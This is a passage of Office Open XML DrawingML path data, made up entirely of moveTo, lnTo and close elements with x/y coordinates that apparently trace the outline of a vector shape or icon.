                    <a:pt x="14343" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14269" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14196" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="7227"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14233" y="6750"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14123" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14746" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14966" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="6750"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6273" y="7887"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6199" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="7887"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7630" y="551"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7777" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="551"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10821" y="9281"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10968" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10711" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="9281"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13903" y="9941"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13829" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14159" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14269" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14159" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="9941"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7593" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7447" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2751" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="0"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12912" y="10675"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12839" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13169" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="10675"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13572" y="11262"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13499" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="11408"/>
